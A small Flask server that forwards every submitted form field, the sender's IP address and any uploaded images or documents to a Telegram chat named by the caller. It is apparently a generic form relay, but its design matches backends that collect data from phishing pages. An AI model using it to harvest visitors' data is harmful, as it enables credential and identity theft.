import os
import requests
import mimetypes
import json
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not set")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


@app.route("/", methods=["GET"])
def home():
    return "Server running"


@app.route("/send", methods=["POST"])
def send():
    chat_id = request.form.get("chat_id")

    if not chat_id:
        return jsonify({"ok": False, "error": "chat_id missing"}), 400

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    text_lines = [
        "📱 New Submission",
        f"IP Address: {user_ip}",
        ""
    ]

    for key in request.form:
        if key != "chat_id":
            text_lines.append(f"{key}: {request.form.get(key)}")

    # ================= SEND TEXT =================
    msg_res = requests.post(
        f"{TG_API}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": "\n".join(text_lines),
            "parse_mode": "Markdown"
        }
    )

    if not msg_res.ok or not msg_res.json().get("ok"):
        return jsonify({"ok": False, "error": "Failed to send message"}), 500

    # ================= PROCESS FILES =================
    images = []
    documents = []

    for file_key in request.files:
        file = request.files[file_key]
        if not file.filename:
            continue

        mime_type, _ = mimetypes.guess_type(file.filename)

        if mime_type and mime_type.startswith("image"):
            images.append(file)
        else:
            documents.append(file)

    # ================= SEND IMAGES IN BATCHES =================
    def send_image_batch(batch):
        media = []
        files_payload = {}

        for i, file in enumerate(batch):
            attach_name = f"file{i}"
            media.append({
                "type": "photo",
                "media": f"attach://{attach_name}"
            })
            files_payload[attach_name] = (file.filename, file.stream)

        res = requests.post(
            f"{TG_API}/sendMediaGroup",
            data={
                "chat_id": chat_id,
                "media": json.dumps(media)
            },
            files=files_payload
        )

        return res.ok and res.json().get("ok")

    # Split into batches of 10
    for i in range(0, len(images), 10):
        batch = images[i:i+10]

        if not send_image_batch(batch):
            return jsonify({"ok": False, "error": "Failed sending image batch"}), 500

    # ================= SEND DOCUMENTS (UNCHANGED) =================
    for file in documents:
        res = requests.post(
            f"{TG_API}/sendDocument",
            data={"chat_id": chat_id},
            files={"document": (file.filename, file.stream)}
        )

        if not res.ok or not res.json().get("ok"):
            return jsonify({"ok": False, "error": "Failed sending document"}), 500

    # ================= FINAL SUCCESS =================
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)